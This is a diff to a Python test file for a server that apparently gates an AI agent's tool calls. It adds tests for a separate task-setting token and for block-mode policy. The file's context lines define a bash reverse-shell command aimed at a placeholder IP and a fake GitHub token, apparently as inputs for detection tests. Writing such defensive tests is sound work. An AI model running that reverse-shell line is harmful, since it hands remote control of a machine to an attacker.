@@ -17,16 +17,17 @@ ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
 SERVE = os.path.join(ROOT, "cli", "moorai-serve.mjs")
 NODE = os.environ.get("NODE", shutil.which("node") or "node")
 TOKEN = "py-client-token-0123456789"
+TASK_TOKEN = "py-client-task-writer-0123456789"
 REVSHELL = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"
 GH = "ghp_ABCDEFghijklMNOPqrstUVWXyz0123456789"
 
 
-def start(home, extra_env=None):
+def start(home, extra_env=None, extra_args=()):
     env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "HOME": home, "USERPROFILE": home,
            "XDG_CONFIG_HOME": os.path.join(home, ".config"), "XDG_STATE_HOME": os.path.join(home, ".local", "state"),
            "MOORAI_SERVER_URL": "http://127.0.0.1:1", "MOORAI_SERVICE_ID": "py-client"}
     env.update(extra_env or {})
-    p = subprocess.Popen([NODE, SERVE, "--port", "0"], cwd=home, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    p = subprocess.Popen([NODE, SERVE, "--port", "0", *extra_args], cwd=home, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     line = p.stdout.readline()
     if not line:
         p.kill()
@@ -135,6 +136,42 @@ class AuthAndErrors(unittest.TestCase):
             proc.stdout.close()
             proc.stderr.close()
             shutil.rmtree(home, ignore_errors=True)
+
+    def _stop(self, proc, home):
+        proc.terminate()
+        proc.wait(10)
+        proc.stdout.close()
+        proc.stderr.close()
+        shutil.rmtree(home, ignore_errors=True)
+
+    def test_task_token_is_separate(self):
+        home = tempfile.mkdtemp(prefix="moorai-py-task-")
+        proc, url = start(home, {"MOORAI_SERVE_TOKEN": TOKEN, "MOORAI_SERVE_TASK_TOKEN": TASK_TOKEN})
+        try:
+            agent = MoorAIClient(url, token=TOKEN, task_token="")
+            with self.assertRaises(MoorAIError) as ctx:
+                agent.task("py-t1", "Refactor the parser")
+            self.assertEqual(ctx.exception.status, 403, "the tool-call token cannot set a task")
+            self.assertEqual(agent.tool_call("Bash", {"command": "ls"})["decision"], "allow")
+            app = MoorAIClient(url, token=TOKEN, task_token=TASK_TOKEN)
+            self.assertEqual(app.task("py-t1", "Refactor the parser")["captured"], True)
+            self.assertEqual(app.tool_call("Bash", {"command": "ls"})["decision"], "allow", "tool calls still use token")
+        finally:
+            self._stop(proc, home)
+
+    def test_block_mode_without_a_token_refuses_task(self):
+        home = tempfile.mkdtemp(prefix="moorai-py-block-")
+        policy = os.path.join(home, "policy.json")
+        with open(policy, "w") as f:
+            json.dump({"captureTier": "content-free", "intentAlignment": "block"}, f)
+        proc, url = start(home, extra_args=("--policy-file", policy))
+        try:
+            with self.assertRaises(MoorAIError) as ctx:
+                MoorAIClient(url, token="", task_token="").task("py-b1", "Refactor the parser")
+            self.assertEqual(ctx.exception.status, 403)
+            self.assertIn("--task-token-file", str(ctx.exception))
+        finally:
+            self._stop(proc, home)
 
     def test_unreachable(self):
         with self.assertRaises(MoorAIError) as ctx:
